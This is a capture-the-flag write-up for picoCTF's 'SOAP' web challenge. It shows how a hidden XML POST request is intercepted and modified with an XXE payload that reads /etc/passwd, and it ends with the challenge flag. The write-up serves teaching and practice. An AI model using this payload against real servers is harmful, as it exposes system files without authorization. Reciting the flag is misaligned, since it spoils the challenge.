# SOAP

## Challenge Info 

Tags: Web Exploitation, XXE

AUTHOR: GEOFFREY NJOGU

100 points

## Description
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

## Solution 

The given website just give the details of the listed orgs. Let's check the source code. 

<img width="546" alt="image" src="https://user-images.githubusercontent.com/66155978/225885923-690ce079-1509-482c-8f34-97572f663f42.png">

So its making a POST request to /data directory having ID parameter and this process is hidden. 

Time to capture the request using Burpsuite. 

<img width="454" alt="image" src="https://user-images.githubusercontent.com/66155978/225886241-f1e1283e-03ff-4eed-a86d-7cf6c47b6e18.png">

XML!!! So there's an XML code, based on the challenge name and tag we can assume that a XXE payload could be used to read the /etc/passwd file. 
So let's modify the captured request and try to read the file. 

<img width="455" alt="image" src="https://user-images.githubusercontent.com/66155978/225886826-47fde5e9-e47e-4829-86ea-44d05da725f4.png">

```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ELEMENT foo ANY > 
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]> 
<data>
<ID>
&xxe;
</ID>
</data>
```


Forward the request and get the flag🚩

<img width="471" alt="image" src="https://user-images.githubusercontent.com/66155978/225888240-a6c23641-3560-4ba2-ac55-bbb2d58d2079.png">


## Flag

picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e} 
